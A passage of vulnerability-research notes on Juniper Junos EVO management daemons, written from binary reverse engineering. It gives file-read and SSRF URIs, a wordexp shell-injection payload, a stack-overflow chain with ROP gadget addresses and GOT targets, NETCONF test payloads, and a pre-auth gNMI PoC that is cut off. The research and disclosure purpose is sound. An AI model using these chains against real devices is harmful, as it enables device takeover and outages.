  input = xmlParserInputBufferCreateFilename((char *) filename, sdo.sdo_encoding);
  ```
  `xmlParserInputBufferCreateFilename` accepts any URI that libxml2 supports:
  `file://`, `http://`, `ftp://`, `compress://`, etc.
  If `filename` flows from NETCONF RPC parameter → arbitrary local file read or SSRF.
  On Junos: `file:///var/etc/shadow`, `file:///etc/passwd`, `file:///config/juniper.conf`.
  `http://internal-host/path` → SSRF against management-plane reachable hosts.
  No URI scheme filtering or path restriction.

FINDING S3 — slax:sysctl → unbounded alloca stack overflow (slaxext.c:2108)
  ```c
  size_t size = 0;
  sysctlbyname((char *) name, NULL, &size, NULL, 0);  // kernel sets size
  char *buf = alloca(size + 1);                        // NO BOUND CHECK
  ```
  `name` = sysctl variable name (attacker-controlled if from NETCONF RPC param).
  `size` from kernel is unbounded. Large sysctl variables on an active router:
    kern.file:           ~500KB (all open FDs)
    net.inet.tcp.pcblist: ~10MB on a busy SRX
  `alloca(10MB)` → stack pointer past guard page → SIGSEGV → DoS.
  Secondary: sysctl read oracle — can read any sysctl accessible to mgd uid.
  NOTE: DoS only — NOT RCE. Alloca puts buf N bytes below saved_RIP; the
  subsequent sysctlbyname(buf, size) write cannot bridge that gap:
    saved_RIP at entry_RSP - 8; buf at entry_RSP - fixed_frame - align(size+23, 16);
    write covers [buf, buf+size-1], which is entirely below saved_RIP.
  Stack smash is geometrically impossible without a separate write gadget.

FINDING S4 — slaxSlaxToXpath → unbounded alloca (slaxloader.c:891)
  Same alloca class as S3. In the S1 call chain:
  ```c
  // slaxloader.c:851 — slaxSlaxToXpath(tag, nointern, expr, errors)
  // called by slaxExtEvaluate (slaxext.c:2857) with attacker-controlled expr
  sd.sd_len = strlen(slax_expr);       // line 889 — attacker controls length
  buf = alloca(sd.sd_len + 1);         // line 891 — NO BOUND CHECK
  ```
  `slax_expr` = the XPath expression string passed to `slax:evaluate`.
  If a SLAX script calls `slax:evaluate($rpc-param)`, the attacker controls `sd_len`.
  Sending a 1MB NETCONF RPC param → `alloca(1MB+1)` → stack overflow before S1's
  XPath injection is even attempted. DoS via S4 is easier to reach than XPath injection
  via S1 for any script that pipes input directly.
  Source: slaxloader.c:889-891, same binary translation unit as slaxExtEvaluate caller.
  NOTE: DoS only — NOT RCE. Binary confirmed in EVO 23.4R2 libslax.so.3 (offset 0x2e8b0):
    sub rsp, 0x10a8        ; fixed frame (includes slax_data_t @ [rbp-0x10c0])
    call strlen(r12)       ; 0x2e9d1: strlen(slax_expr)
    lea edx, [rax+1]       ; sd_len+1
    lea rax, [rdx+0x17]
    and rax, ~0xf          ; align to 16
    sub rsp, rax           ; 0x2e9ed: alloca — NO bound check
    call memcpy(rcx, r12, rdx)  ; 0x2e9fc: memcpy(buf, slax_expr, sd_len+1)
  Same geometry as S3: alloca + memcpy(N) cannot reach saved_RIP (N bytes below).

SLAX trigger path status — EVO 23.4R2 (confirmed by binary extraction):
  cscript (/usr/libexec/ui/cscript) links libslax.so.3 — SLAX runtime present.
  mgd (/usr/sbin/mgd) does NOT link libslax directly; delegates via cscript child process.
  EVO 23.4R2 ships ZERO SLAX (.slax) scripts. All operational scripts are Python.
  meta-acx-f-re64 layer has Python commit/op scripts; meta-ui64 has only junos.xsl (import lib).
  CONCLUSION: S1–S4 are NOT standalone pre-auth exploits on EVO 23.4R2. They require
    an admin-installed SLAX script that passes an RPC parameter to slax:evaluate/slax:sysctl.
    Attack surface exists but trigger path is post-auth (requires SLAX script installation).
  Junos Classic (FreeBSD-based, non-EVO): CONFIRMED SAME. Surveyed junos-srxsme 10.4R7.5,
    11.4R3.7, 21.4R3-S3.4, 23.4R2-S3.9. +CONTENTS file (BSD pkg manifest) across all versions
    lists zero .slax files. CONCLUSION: No version of Junos Classic SRX ships pre-installed
    SLAX scripts. S1-S4 require operator-installed scripts on BOTH Classic and EVO.

## Binary RE Targets (automation layer)

BINARIES EXTRACTED from EVO 23.4R2 meta-ui64_Yocto_2.2_x86_64.fs squashfs:
  mgd:          /usr/sbin/mgd     (177K, x86-64 PIE, stripped)
  libslax.so.3: /usr/lib64/libslax.so.3 (282K, x86-64)
  cscript:      /usr/libexec/ui/cscript (145K, x86-64 PIE, stripped)
  libxml2.so.3: /usr/lib64/libxml2.so.3 (present, 2.9.9)
  libengine.so.1: /usr/lib64/libengine.so.1 (2.4M — Junos CLI/RPC engine, NETCONF)

SECURITY MITIGATIONS (confirmed by binary analysis):
  mgd:       PIE=YES, RELRO=NONE, Stack-canary=NO, NX=YES, BIND_NOW=NO
  cscript:   PIE=YES, RELRO=NONE, Stack-canary=NO, NX=YES, BIND_NOW=NO
  libxml2.so.3: RELRO=NONE, Stack-canary=NO, NX=YES
  IMPLICATION: GOT of libxml2.so.3 is WRITABLE throughout execution.
    GOT entries for vtable function pointers (0x14dbc0–0x14de98) are writable.
    GOT entries for libc functions (calloc@0x14dcd8, malloc@0x14dc60,
    free@0x14dde8, etc.) are all writable — any write-to-GOT = arbitrary call.
    No stack canary = stack overflows (if found) directly overwrite saved RIP.
    NX prevents stack/heap shellcode; need ROP gadgets.

Functions in libslax: slaxExtRegister (0x2b7c0), slaxSlaxToXpath (0x2e8b0)
  slaxExtEvaluate and slaxExtSysctl are local (non-exported) — in libslax.so.3
  but not in the dynamic symbol table.
Functions in mgd (closed): jcs_execute_rpc, jcs_open_connection, slax_document_fetch
libxslt.so: xmlXPathEval (called by slaxExtEvaluate — XPath evaluation engine)

---

## NETCONF Error Response Reflection (mgd)

**Attack surface:** `<rpc-error>` responses from mgd reflect user-controlled fields
back to the caller. Two fields are direct input echoes:

- `<bad-element>` — copied from the offending XML element name in the user's RPC.
  Source: mgd reads the tag name from the parsed XML node and writes it into the
  error reply. No namespace stripping on Junos; full prefixed name is reflected.
- `<error-path>` — config hierarchy path, partially derived from user-supplied
  path in edit-config/get-config requests.

**Injection vectors:**
1. **XML entity injection via bad-element**: Send an RPC with element names
   containing XML metacharacters (e.g., `<foo&bar>`, `</foo>`). If mgd constructs
   `<bad-element>` by string concatenation rather than xmlWriter, entity injection
   lands in the response stream. Downstream tools parsing the response without
   sanitization get malformed XML.
2. **XXE via error-path**: If edit-config requests with XPath-like path expressions
   are reflected into `<error-path>` without escaping, an attacker controlling the
   config path string could inject XML entities into operator tooling that consumes
   the NETCONF session.
3. **Buffer sizing in bad-element construction**: mgd likely has a fixed format
   string for error responses. If `bad-element` content exceeds that buffer and
   mgd uses `snprintf` with the element name length, the truncation point is a
   crash oracle for length limits in mgd's XML output path.

**RFC 6241 §4.3 constraint**: `<bad-element>` MUST contain the element's
*decoded name* (NCName or QName), not raw XML bytes. A compliant implementation:
  libxml2 parse → decoded node name → `error-info/bad-element` → re-serialized
RFC-compliant mgd: entity-encoded input (`&amp;`) → decoded (`&`) stored in
node name → re-escaped (`&amp;`) on output. No injection from this path.

**The actual injection surface is the shortcut path:**
  `xmlGetLastError()->str1` — libxml2's error string, copied from raw input
  buffer BEFORE entity decoding. If mgd sources `<bad-element>` from
  `xmlGetLastError()->str1` rather than from the parsed node name, raw
  input bytes land in the output stream. The shortcut is common in fast
  error-path code where parse failed before a valid node was created.

**Distinguishing the two paths (test vectors for `netconf_reflect.py`):**
  Payload `foo&amp;bar` → RFC-compliant: reflects `foo&amp;bar`
                       → shortcut path: reflects `foo&amp;bar` (same here)
  Payload `foo&bar`    → RFC-compliant: XML parse error; node never created;
                         mgd may fall back to `str1` → reflects `foo&bar`
                       → shortcut path: also reflects `foo&bar`
  The distinguishing case: after a valid-XML-but-invalid-config RPC
  (parse succeeds, mgd rejects the config element), the node exists:
  Payload `foo&amp;bar` as element name in valid XML context:
    → RFC path (decoded name): stores `foo&bar` → reflects `foo&amp;bar`
    → shortcut from raw input: stores `foo&amp;bar` → reflects `foo&amp;bar`
  Use `entity_ref` probe (`foo&amp;bar`) with a syntactically VALID RPC
  (valid XML that mgd will reject at config layer, not parse layer) to
  distinguish. `REFLECTED_TRANSFORMED` result = RFC path. `REFLECTED_EXACT`
  = shortcut, raw-bytes injection surface confirmed.

**Test approach (controlled env only):**
```xml
<!-- Send RPC with long element name (>256 bytes) to probe truncation -->
<rpc xmlns="urn:ietf:params:xml:ns:netconf:base:1.0">
  <edit-config>
    <target><candidate/></target>
    <config>
      <AAAAAAAAAA...256xA.../>
    </config>
  </edit-config>
</rpc>

<!-- XML entity injection test -->
<rpc xmlns="urn:ietf:params:xml:ns:netconf:base:1.0">
  <edit-config>
    <target><candidate/></target>
    <config>
      <configuration>
        <system>
          <invalid&amp;element/>
        </system>
      </configuration>
    </config>
  </edit-config>
</rpc>
```

**Binary RE results (EVO 23.4R2.14 libengine.so.1 + libjunos-netconf.so.1):**

`gram_xml_rpc_reply_open` (0x11f520):
  Core copy: `strlcpy(context+0x1e1c8, context+0x68, 0x2000)` — copies element
  name from received RPC into the context struct's 8KB reply buffer.
  Buffer sizing confirmed (binary): fields at context+0x201c8 (byte) and
  context+0x201d0 (byte) begin immediately after the 0x2000-byte buffer at
  0x1e1c8 (seen at 0x11e836/0x11e83f via `mov byte ptr [r12+0x201c8], 0` /
  `mov byte ptr [r12+0x201d0], 0`). strlcpy limit matches buffer exactly — NO
  OVERFLOW. Maximum reflected length: 8191 bytes.
  Namespace handling: before the copy, function calls strstr(element_name,
  "xmlns="), xml_attr_named_xmlns, xml_attr_strip_xml[...] to process namespace
  attributes on the reply element. These use the raw element name as-is.

`gram_xml_report_error` (0x11f510): JMP stub → `gram_file_report_error`
  (0x11e9a0). The file reporter allocates 8KB on the stack (`sub rsp, 0x2000`),
  formats error context via `snprintf(buf, 0x2000, '%.*s', len, content)`,
  then logs via dprintf-style call with limit 0x7f00. This is the LOG path, not
  the NETCONF wire reply builder. No overflow.

`js_emit_error_response` (libjunos-netconf.so.1, 0x6740):
  Allocates 8KB stack (`sub rsp, 0x2008`); formats error details using
  `snprintf(buf, 0x2000, '%s %s %s\n \t%s ', ...)` before logging. Error
  field array stored in heap-allocated dynamic buffers (dynamic realloc via
  appender at 0x7c30 — no fixed size). NO OVERFLOW.

`"bad-element"` string present only in libjunos-netconf.so.1 — used in the
  CLIENT-SIDE NETCONF response parser (0x7ce0). Server-side tag construction
  in libengine uses runtime tag-name strings passed as function arguments;
  no "bad-element" literal in libengine or mgd binary.

**Result**: NO BUFFER OVERFLOW found on the bad-element reflection path in
  EVO 23.4R2. The element name is reflected intact (up to 8191 bytes). The copy
  uses strlcpy with a limit matching the destination buffer size exactly.
  Reflection confirmed as a surface but not exploitable via overflow on this
  binary version.

---

## Pre-Auth NETCONF XML Parsing Surface (EVO 23.4R2.14)

**Binary**: mgd (evo-ui64, 177K PIE) -> libjunos-junoscript.so.1 (evo-jimbase, 76K)
  -> libjunos-xmlutil.so.1 (evo-jimbase)

**Library attribution**: xml_initial_handshake is NOT in evo-ui64 libs (libengine,
  libjunos-netconf). It resolves via the PLT stub at mgd+0xf1c0 -> GOT 0x2b320
  -> libjunos-junoscript.so.1 (evo-jimbase partition, separately mounted squashfs).
  Confirmed via `objdump -T libjunos-junoscript.so.1 | grep -v UND`.

### xml_initial_handshake (libjunos-junoscript.so.1 +0x7b60, 0x14e bytes)

```
xml_input_match(peer, 2, callback)   ; read first XML element from TCP stream
xml_input_match(peer, 3, callback)   ; second match attempt
repz cmps ecx=0xb                    ; strcasecmp against "junoscript" (10 bytes + NUL)
if match: xml_check_initial_attributes(name_ptr, output_buf)
if name == "junoscript": xml_initial_handshake_send(peer, system_name)
```

Flow is linear; no recursion. xml_input_match2 (+0xeb10, 673 bytes) implements the
callback-driven XML reader; it calls xml_parse_attributes before returning element
context to the caller.

### xml_check_initial_attributes (libjunos-junoscript.so.1 +0x7a60, 0xf3 bytes)

```
strtol("1.0", NULL, 0) = 1           ; compile-time version constant (decimal, stops at '.')
xml_parse_attributes(buf_0x290, 40, xml_string)
xml_get_attribute(buf, "version")
strtol(version_str, NULL, 0)         ; attacker-supplied version string
compare against 1
xml_get_attribute(buf, "junos:key")
if found: js_client_data[0xa2] = 1   ; TLS/key flag
```

**Version bypass**: strtol stops at the first non-numeric character. "1.0" -> 1;
attacker sends version="1" or version="1anything" -> strtol=1 -> passes the check.
The version gate is trivially satisfied; no signature or HMAC.

### xml_parse_attributes (libjunos-xmlutil.so.1 +0x1730, 0x1e9 bytes)

```
args: rdi=buf (0x290=656 bytes on caller's stack), rsi=max_attrs=40, rdx=xml_string
```

Attribute storage is POINTER-ONLY — no memcpy, no strdup:

```asm
[rcx]        = attr_name_ptr    ; pointer into original xml_string
[rdi+rdx*8]  = attr_value_ptr  ; pointer into original xml_string
```

ebx increments by 2 per attribute; guard: `cmp ebx, max_attrs(40)` -> max 20
attribute PAIRS. 20 pairs x 2 pointers x 8 bytes = 320 bytes < 656-byte buffer.

xml_unescape called in-place on each value: shrinks or equal length (& sequences
expand to 1 char, not longer) -> no overwrite past original string bounds.

Null bytes written in-place in the original xml_string to terminate name and value
tokens. The xml_string itself is caller-owned; libjunos-xmlutil does not copy it.

**Result**: NO BUFFER OVERFLOW. Pre-auth NETCONF XML parsing path is hardened.
  Pointer storage with bounded count; no fixed-size destination copy; in-place
  unescape cannot grow strings. Attack surface exists but no memory corruption
  primitive found in this code path.

### Pre-Auth Surface Summary

| Symbol | Library | Offset | Result |
|--------|---------|--------|--------|
| xml_initial_handshake | libjunos-junoscript.so.1 | +0x7b60 | No vuln; strcasecmp gate |
| xml_check_initial_attributes | libjunos-junoscript.so.1 | +0x7a60 | Version bypass trivial; no overflow |
| xml_parse_attributes | libjunos-xmlutil.so.1 | +0x1730 | Pointer storage; no copy; hardened |
| xml_input_match2 | libjunos-junoscript.so.1 | +0xeb10 | Callback reader; no alloc vuln found |

**FINDING 2 upgrade status**: No pre-auth memory corruption primitive found in the
  NETCONF XML parsing path. FINDING 2 (vtable overwrite) remains POST-AUTH.
  xml_input_rpc (mgd PLT -> GOT 0x2ab80) analyzed — POST-AUTH DoS only (see FINDING 4).
  Pre-auth surface exhausted; no upgrade path identified.

---

## Post-Auth: wordexp Tilde Expansion via DDL Home Directory (EVO 23.4R2.14)

**Binary**: mgd (evo-ui64), function starting at +0x14ad5

**Classification**: POST-AUTH. wordexp call at +0x14cff is in the same function
  as mgmt_peer_auth_user call at +0x14b24. Execution order:

```
+0x14b24  call mgmt_peer_auth_user   ; authentication — must succeed
...
+0x14ad5  call ddl_get_value_string  ; reads "directory" key from DDL config
           GOT 0x2ad80               ; returns configured home directory string
...
+0x14cff  call wordexp               ; PLT -> GOT 0x2b5b0
           if dir[0] == '~': wordexp(dir, &result, 0)
```

wordexp is only reached after authentication completes. The home directory value
comes from ddl_get_value_string("directory") — DDL-configured per-user home path,
not a direct protocol input.

**Chain**: config write access -> set user[X] home-directory "~/${IFS}cmd${IFS}arg"
  -> NETCONF auth as user X -> wordexp() -> shell injection -> RCE

**Constraint**: Requires (1) authenticated config write access to set the DDL
  home-directory field, AND (2) authentication as that user. Both gates must pass
  before wordexp executes. Not a standalone bug; a chain link requiring prior access.

**Flags**: wordexp called with flags=0; WRDE_NOCMD not set. Shell command
  substitution $(...) and backtick expansion are both enabled. Any wordexp-capable
  expansion in the home directory string executes as the mgd process user.

**Reference**: mgd +0x14cff; PLT stub wordexp=+0xf6e0; GOT 0x2b5b0.

---

## Architecture: SSH-Level Authentication (EVO 23.4R2.14)

Junos EVO NETCONF authentication is handled by the SSH daemon BEFORE mgd runs.
mgd receives an already-authenticated session; the username is injected via SSH
environment variables, parsed by mgd main() at +0x10c5e:

```
strstr(ssh_env, "user")     ; find "user=" in SSH_CLIENT env string
strlcpy(dst, value, 0x11)   ; copy to 17-byte field in peer struct
                             ; 0x11 limit = safe, no overflow
```

The username stored at peer+0x80 (via mgmt_peer_auth_user in libddl-util.so.1)
is a session attribute, not a gate that mgd enforces. All processing inside mgd
(including ddl_start_command_mode → gram_yyparse) is effectively post-SSH-auth.

Implication for attack surface: there is no mgd-level "pre-auth" window beyond
the NETCONF hello exchange (already analyzed as hardened). auth_authenticate at
mgd+0x115a0 is secondary re-auth (privilege escalation checks), not the primary
session gate.

**auth_authenticate (+0x115a0, 0xee bytes):**
```
priv_raise()
getpwnam(username)   ; username = from SSH env
endpwent()
priv_lower()
if type==2: crypt(user_password, pw_passwd) ; standard UNIX crypt
            strcmp(crypt_result, stored_hash) ; compare
```
NO buffer overflow. No user-controlled format string. Standard crypt+strcmp flow.

**popen("/usr/bin/wall") in auth_get_challenge (+0x118a0):**
```
popen("/usr/bin/wall", "w")    ; broadcast to terminals
fputs(rdi_arg, pipe)           ; write message
pclose(pipe)
```
Called from TWO sites only:
  - mgd+0x11dd6: rdi = static string "Commit was not confirmed; ..." (0x20758)
  - mgd+0x11e7f: rdi = static string "Commit was not confirmed; ..." (0x207e0)
Both args are RIP-relative rodata constants. **Not user-controlled. Not injectable.**

---

## Post-Auth Stack Exhaustion via XML Element Names (EVO 23.4R2.14)

**Location**: gram_xml_cmdl_get_line (libengine.so.1 +0x11eb80, 1983 bytes)
**Context**: NETCONF XML tokenizer, called from ddl_start_command_mode post-SSH-auth

Two unbounded alloca patterns in the element name processing loop:

```asm
; Pattern 1 (+0x11ed25-0x11ed55), Pattern 2 (+0x11ee62-0x11ee8f):
call strlen(element_name_ptr)    ; len = strlen(xml element name)
lea 0x1(%rax), %rdx              ; rdx = len+1
add $0x18, %rax                  ; rax = len + 25 (alignment pad)
and $~0xf, %rax                  ; round to 16 bytes
sub %rax, %rsp                   ; *** ALLOCA: stack grows by len bytes ***
call memcpy(alloca_buf, element_name, len+1)
```

The alloca size = strlen(xml_element_name) with NO upper bound check. The element
name comes from xml_input_match (libjunos-junoscript callback parser), which reads
directly from the TCP stream with no built-in length cap.

**Impact**: A valid NETCONF session (post-SSH-auth) sending an XML element with a
  multi-MB name causes mgd to alloca multi-MB on the stack, triggering:
  - SIGSEGV on stack guard page hit → mgd process crash → session terminated
  - No heap corruption; no code execution

**Classification**: Post-auth crash (session DoS). Not exploitable for RCE without
  additional bypass of stack guard pages.

**Note**: Pattern 3 at +0x11eeeb uses realloc (not alloca) with proper NULL check
  and space guard — not exploitable.

**Dynamic buffer pattern (safe)**:
```
strlen(str) → compute new_size = (r13 + r14 + 0x2000) & ~0x1fff
realloc(buf, new_size)          ; checked: je error_handler on NULL
space check before memcpy       ; ja skip_realloc confirms fit
```

---

## GOT Writability (RELRO=OFF) — Attack Surface Note

RELRO is confirmed OFF on mgd and libengine.so.1 (no PT_GNU_RELRO segment, binary-
verified in prior session). The GOT is writable after program start.

This means a write-what-where primitive targeting any imported function's GOT entry
would redirect execution on the NEXT call to that function. No BSS write needed.

**Selected writable GOT entries (mgd, load-base-relative):**
  - 0x2ab80: xml_input_rpc (called from mgd_get_file_with_cert)
  - 0x2b5b0: wordexp (called from cmd_cli_directory post-auth)
  - 0x2b320: xml_initial_handshake (called from main during every new session)
  - 0x2ac20: popen (called from auth_get_challenge on rollback events)
  - 0x2aaf8: mgmt_peer_auth_user (called from multiple command handlers)

Overwriting any one of these with a ROP gadget address provides control over the
next call. xml_initial_handshake's GOT entry is particularly interesting — it's
called once per NETCONF session from main(), so a GOT overwrite that persists
across session reconnects would trigger on the next incoming connection.

**Constraint**: Still requires a write primitive. FINDING 2's write primitive
  search exhausted libengine strcpy/sprintf sites (prior session). Remaining
  hypothesis: SLAX script with slax:invoke chain (requires config write access).

---

## ASLR Bypass Exhaustion — libengine Printf Survey

**Goal**: Find a NETCONF-wire-visible pointer leak to bypass ASLR for the GOT overwrite chain.

**Finding**: All 14 format strings with `%p`/`%x` in libengine.so.1 and libjunos-netconf.so.1
route to `js_traceout` (trace file) or `ctrace` (trace file), not to stdout/NETCONF wire.

**One apparent exception** — libengine+0xe9532:
```
lea 0x1347a0(%rip), %rdi   # "SCHEMA: db_read_tlv_file: %s; tlvfp = %p and tlvfp_value = %ld"
xor %eax, %eax
call printf@plt             # stdout = NETCONF TCP channel
```

This `printf@plt` call bypasses js_traceout and writes to stdout. But:

1. The enclosing function (entry at libengine+0xe9470, size ~0x400 bytes) is called only from:
   - `ddl_schema_init` (libengine+0x114dd5) — DDL schema load at process startup
   - One other startup-phase caller (libengine+0x10970a)

2. `set_ddl_schema_init_debug` (libengine+0x117a60) is the sole writer of `xp_debug`:
   ```
   mov %edi, 0x3ef9c2(%rip)  # → xp_debug at 0x507428
   ret
   ```
   Called from mgd at 0x19a02, conditional on `ui_hooks_util_package_validating() == 0`,
   only during the dual-phase bootup state machine (startup, not per-session).

3. The printf path fires at boot during `ddl_schema_init`. By the time a NETCONF session
   is established, schema init has already completed. stdout at boot-time is NOT the
   NETCONF TCP channel (channel is not set up until after SSH auth + subsystem spawn).

**Conclusion**: No NETCONF-wire-visible address leak found in any of the surveyed
  libraries. ASLR bypass for the GOT chain remains open.

---

## FINDING 3 — Post-Auth Stack Overflow in mgd_reboot_command (No Canary)

**Location**: libengine.so.1, `mgd_reboot_command` at +0x3fde0

**Prologue analysis** — NO stack canary:
```
3fde0: push %rbp
3fde1: mov  %rsp, %rbp
3fdf3: sub  $0x6148, %rsp    ; 24904-byte frame, no fs:0x28 canary setup
```

**Stack layout**:
```
rbp - 0x6148 : bottom of frame (RSP on entry)
rbp - 0x2030 : sprintf destination buffer (8192 bytes; occupies rbp-0x2030 to rbp-0x30)
rbp - 0x0030 : 8 bytes padding/local (immediately above buffer end)
rbp - 0x0028 : saved rbx  |
rbp - 0x0020 : saved r12  |  40 bytes saved regs
rbp - 0x0018 : saved r13  |
rbp - 0x0010 : saved r14  |
rbp - 0x0008 : saved r15  |
rbp          : saved rbp (caller)
rbp + 0x0008 : return address  ← overflow target
```

**Vulnerable sprintf at libengine+0x416cd**:
```
416b3: lea -0x2030(%rbp), %r8       ; r8 = 8192-byte stack buffer (0x2000 bytes)
416c6: lea 0x1ca3b3(%rip), %rsi     ; "set chassis display permanent message halt@%s"
416cd: call sprintf@plt             ; sprintf(buf, fmt, rdx)
```
`rdx = (%r12)` where `r12` = the `rsi` arg to `mgd_reboot_command` — the DDL-parsed
command parameter struct. `(%r12)` is the user-supplied halt message string.

**Overflow math**:
- Buffer: 8192 bytes (rbp-0x2030 to rbp-0x30, i.e., 0x2000 bytes)
- Format prefix: `"set chassis display permanent message halt@"` = 42 bytes
- Overflow begins: message > 8192 - 42 - 1 = 8149 bytes
- Saved rbx corrupted: message = 8158 bytes (buffer + 8 pad + 8 rbx = 8208 written)
- Return address overwritten: message = 8214 bytes (8256 total bytes written)

**Chain with RELRO=OFF**:
- No canary + overwrite return address → ROP chain using libengine gadgets
  (pop rdi @ +0x5b18d, system@PLT @ +0x35ec0)
- Partial overwrite: message = 8158 bytes corrupts saved r12 (command struct ptr);
  subsequent struct dereferences in same frame redirect control flow

**Classification**: POST-AUTH. Requires authenticated NETCONF session with operator
  or superuser access to execute `request system reboot message <text>`.

**DDL constraint — CONFIRMED ABSENT** (libchassis_cmd-dd.tlv, EVO 23.4R2.14):
  TLV binary analysis: TAG 0x0b (max-length) for the halt `message` parameter = `ff ff ff ff`
  (0xffffffff = no enforced limit). Verified at file offsets 0x10d9da and 0x10e50a.
  DDL dispatches the full, untruncated message string to `mgd_reboot_command`.
  The overflow is NOT mitigated at the DDL layer.

**Second sprintf chain** — libengine+0x416eb:
```
416d9: rcx = rbx              ; second user-supplied arg
416e5: lea 0x1e99e0(%rip), %rsi  ; "%s %s"
416eb: call sprintf@plt       ; sprintf(buffer, "%s %s", buffer, rbx)
```
This APPENDS to the same buffer. Combined output of both sprintf calls feeds into
`cmd_pass` at +0x38740, which executes the command string via popen-equivalent.

**Combined impact**: If first sprintf overflows, the second sprintf corrupts further.
  Both calls share the same no-canary stack frame.

---

## FINDING 4 — Post-Auth Stack Exhaustion via Oversized RPC Element Name

**Location**: libjunos-junoscript.so.1, `xml_input_rpc` at +0xe120

**Function role**: Post-hello, post-auth RPC dispatcher. Called by mgd for each
  NETCONF RPC after the NETCONF `<hello>` exchange (ssh-auth → hello → RPC input).

**Frame**: `sub $0x128, %rsp` (296 bytes fixed base). Alloca expands dynamically below.

**Three unbounded alloca+memcpy patterns** (at +0xe34d–0xe38f, +0xe3a7–0xe3d8, +0xe444–0xe46c):

```asm
; Pattern 1: RPC element name (e.g., <lock>, <get-config>, <rpc-method>)
e357:  call strlen(element_name)    ; len = strlen(rpc_element_name)
e363:  lea 1(%rax), %rdx           ; len+1
e367:  add $0x18, %rax             ; alignment pad
e36b:  and $~0xf, %rax             ; round to 16
e36f:  sub %rax, %rsp              ; *** ALLOCA(aligned(len+25)) — NO BOUND ***
e372:  lea 0xf(%rsp), %rax
e381:  ...
e38f:  call memcpy(alloca_buf, element_name, len+1)

; Pattern 2: RPC namespace URI (xmlns="..." attribute value)
e3b1:  call strlen(namespace_ptr)
e3c9:  sub %rax, %rsp              ; ALLOCA — NO BOUND
e3d8:  call memcpy(alloca_buf, namespace_ptr, len+1)

; Pattern 3: inner element name (nested RPC content element)
e449:  call strlen(inner_name)
e45d:  sub %rax, %rsp              ; ALLOCA — NO BOUND
e46c:  call memcpy(alloca_buf, inner_name, len+1)
```

**Source**: Element names and namespace URIs come from xml_input_match → TCP stream.
  xml_input_match2 (callback reader at +0xeb10) imposes no length cap on element names.
  Attacker sends: `<` + 4MB_string + `>` in a valid NETCONF envelope → strlen = 4MB.

**Impact**:
- alloca(4MB) on a stack with 8MB default limit → rsp crosses guard page → SIGSEGV
- mgd process crashes → NETCONF session terminated
- Classification: POST-AUTH DoS (session crash). Stack geometry prevents RCE:
  alloca puts buf N bytes BELOW saved_RIP; memcpy writes into that buf (not past it);
  saved_RIP is never in the write target range.

**Trigger requirement**: Valid SSH credentials + any NETCONF session. No operator-class
  privilege needed — any login-level user can issue RPCs.

**Comparison to gram_xml_cmdl_get_line DoS** (documented above):
  - gram_xml_cmdl_get_line: alloca in XML tokenizer, called from ddl_start_command_mode
  - xml_input_rpc: alloca in RPC dispatcher, called directly from mgd RPC loop
  - Both: post-auth, session DoS only; neither yields RCE without additional primitives
  - xml_input_rpc triggers earlier in the RPC dispatch chain (before DDL command parsing)

**JunoScript TCP (port 3221) vs NETCONF**: xml_input_rpc is reachable from both paths.
  JunoScript raw TCP session: `<junoscript>` hello → xml_input_rpc on each subsequent
  element. NETCONF SSH: hello exchange → xml_input_rpc on each `<rpc>` element.

**Pre-auth investigation conclusion** (JunoScript TCP, port 3221):
  No user/password XML attribute processing found in EVO 23.4R2.14 cli or
  libjunos-junoscript binaries. "password" string in cli binary (0x3303e) is the
  error message "can't read password entry" — not the `<junoscript password="X">`
  attribute name. `user` attribute name not referenced from any XML parsing function.
  JunoScript TCP on EVO 23.4R2 does not process user/password XML attributes in
  userland; authentication is handled upstream (SSH wrapping or Kerberos) before
  cli receives the JunoScript session. No pre-auth memory corruption path via
  credential attribute parsing.

---

## FINDING 5: Pre-auth gNMI/Telemetry Full Access — na-grpcd skip-authentication

**Classification**: CRITICAL — pre-auth unauthenticated access to gNMI Get/Set/Subscribe
**Binary**: `usr/sbin/na-grpcd` (7,650,344 bytes; PIE, no canary, no RELRO)
**Platform**: ACX6160-T (factory default config); any Junos EVO ACX deployment using factory defaults

### Trigger

Factory config `/etc/config/acx6160-t-factory.conf` ships with:
```
services {
    extension-service {
        request-response {
            grpc {
                clear-text { port 32767; }
                skip-authentication;
            }
        }
    }
}
```

`skip-authentication` removes ALL credential checking from the gRPC server on port 32767.
No TLS (clear-text). Any network-reachable host can connect and call any registered service.

### Exposed gRPC Services (port 32767, pre-auth)

```
/gnmi.gNMI/Capabilities   → device model/version fingerprint (read)
/gnmi.gNMI/Get            → arbitrary YANG path read (full config + operational state)
/gnmi.gNMI/Set            → arbitrary YANG path write (FULL CONFIG MODIFICATION)
/gnmi.gNMI/Subscribe      → streaming operational state telemetry

/telemetry.OpenConfigTelemetry/telemetrySubscribe          → streaming sensor data
/telemetry.OpenConfigTelemetry/cancelTelemetrySubscription → session control
/telemetry.OpenConfigTelemetry/getTelemetrySubscriptions   → subscription enumeration
/telemetry.OpenConfigTelemetry/getTelemetryOperationalState
/telemetry.OpenConfigTelemetry/getDataEncodings

/authentication.Login/LoginCheck  → authentication service (also exposed pre-auth)
```

### Impact Chain

```
Attacker (network) → TCP 32767 (clear-text gRPC)
                            |
                   na-grpcd [skip-authentication]
                            |
                   /var/run/japi_mgd (Unix socket)
                            |
                       mgd daemon
                            |
              Junos YANG datastore (read/write)
```

na-grpcd acts as the authentication gateway for all gNMI requests. With
`skip-authentication`, it forwards all gNMI Set operations to mgd over
`/var/run/japi_mgd` without any credential validation. mgd implicitly
trusts requests from na-grpcd (Unix socket = local process trust). This
gives an unauthenticated remote attacker FULL read/write access to the
device's YANG configuration datastore.

### Memory Corruption Absence — Why na-grpcd Has No Pre-Auth RCE Primitive

Binary analysis (all custom Junos code):
- All path/string operations use C++ STL (`std::string`, `std::vector`) — memory-safe
- 144 `strcpy` + 3 `strcat` + 8 `sprintf` imports: all in statically-linked protobuf
  library code (0x3a0000-0x3c0000 range), never in Junos custom handlers
- `fgets` import: present in PLT dynamic symbol table but has no `.rela.plt` entry;
  not actually called at runtime
- gRPC C++ 1.24.1 (statically linked): no known RCE CVEs in this version
- OpenConfig Telemetry subscription path validation uses `std::string` (0x17fd70+)
- gNMI SubscribeRequest path processing: C++ template STL throughout (0x182000+)

**Conclusion**: No memory corruption primitive exists in the pre-auth gRPC request path.
The pre-auth exposure is purely an authorization bypass — not a memory corruption RCE.
The authorization bypass is itself critical (full config write without credentials).

### Proof-of-Concept (Benign Verification)

```python
import grpc
import gnmi_pb2, gnmi_pb2_grpc

# No credentials — cleartext, no auth
channel = grpc.insecure_channel('TARGET:32767')
stub = gnmi_pb2_grpc.gNMIStub(channel)

# Fingerprint via Capabilities (pre-auth)
